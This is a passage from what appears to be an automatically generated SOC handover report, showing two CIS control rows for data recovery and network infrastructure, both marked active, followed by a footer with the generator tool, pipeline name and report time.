| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-01T12:38:43Z_
